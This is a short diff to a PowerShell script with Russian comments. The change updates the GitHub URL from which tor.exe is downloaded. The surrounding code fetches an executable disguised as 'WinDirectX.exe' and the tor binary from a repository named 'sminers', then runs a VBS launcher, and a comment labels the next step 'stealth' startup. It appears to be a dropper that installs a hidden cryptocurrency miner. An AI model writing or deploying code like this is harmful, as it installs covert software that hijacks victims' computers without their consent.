@@ -36,7 +36,7 @@ function update {
     `$web = New-Object System.Net.WebClient
     `$web.Headers.Add("User-Agent", "Mozilla/5.0")
     `$web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe")
-    `$web.DownloadFile("https://github.com/$user/sminers/raw/main/Windows", "$path\tor.exe")
+    `$web.DownloadFile("https://github.com/$user/sminers/raw/main/tor", "$path\tor.exe")
     Start-Process -FilePath "$path\win_start.vbs"
     Write-Host "Обновлено!" -ForegroundColor Cyan
 }
@@ -61,7 +61,7 @@ if (!(Test-Path "$path\WinDirectX.exe")) {
     $web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe")
 }
 if (!(Test-Path "$path\tor.exe")) {
-    $web.DownloadFile("https://github.com/$user/sminers/raw/main/Windows", "$path\tor.exe")
+    $web.DownloadFile("https://github.com/$user/sminers/raw/main/tor", "$path\tor.exe")
 }
 
 # 6. СОЗДАНИЕ ЗАПУСКА (STEALTH + UZS OPTIMIZATION)
